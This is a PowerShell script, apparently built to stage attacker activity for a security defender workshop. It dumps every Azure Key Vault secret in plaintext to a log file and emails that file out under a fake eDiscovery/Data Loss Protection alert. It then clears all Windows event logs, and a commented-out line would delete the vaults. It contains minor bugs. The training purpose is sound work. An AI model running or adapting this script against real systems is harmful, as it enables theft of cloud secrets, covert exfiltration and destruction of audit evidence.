function ExportSecrets()
{
    #execute as current user...
    $vaults = Get-AzKeyVault

    foreach($v in $vaults)
    {
        #export all keys
        $secrets = Get-AzKeyVaultSecret -VaultName $v.VaultName;
    
        foreach($s in secrets)
        {
            $secretText = Get-AzKeyVaultSecret -VaultName $v.VaultName -Name $s.Name -AsPlainText;
    
            $line = "$($v.VaultName)`t$($s.Name)`t$($secretText)";

            add-content "secrets.log" $line;
        }
    
        #delete it...
        #Remove-AzKeyVault $v
    }    
}

function Send()
{
    #send the file
    # Get the credential
    $credential = Get-Credential

    ## Define the Send-MailMessage parameters
    $mailParams = @{
        SmtpServer                 = 'smtp.office365.com'
        Port                       = '587' # or '25' if not using TLS
        UseSSL                     = $true ## or not if using non-TLS
        Credential                 = $credential
        From                       = '#USERNAME#'
        To                         = '#USERNAME#'
        Subject                    = "Microsoft eDiscovery Report - Violation"
        Body                       = 'Data Loss Protection has found outbound mail with PII information'
        DeliveryNotificationOption = 'OnFailure', 'OnSuccess'
        Attachments                = 'secrets.log'
    }

    ## Send the message
    Send-MailMessage @mailParams -Attachments $filepath1;

    #move over the logs

    #clear event logs
}

function MoveLogs()
{
    $path = "C:\github\solliancenet\security-defender-workshop-400\artifacts\day-02";

    copy-item -path "$path\logs-03\logs-05.log" "c:\logs";

    copy-item -path "$path\logs-03\logs-06.log" "c:\logs";
}

function clear-all-event-logs ($computerName="localhost")
{
   $logs = Get-EventLog -ComputerName $computername -List | ForEach-Object {$_.Log}
   $logs | ForEach-Object {Clear-EventLog -ComputerName $computername -LogName $_ }
   Get-EventLog -ComputerName $computername -list
}

#Connect-AzAccount;

#Set-AzContext -Subscription e433f371-e5e9-4238-abc2-7c38aa596a18;

ExportSecrets;

Send

MoveLogs

clear-all-event-logs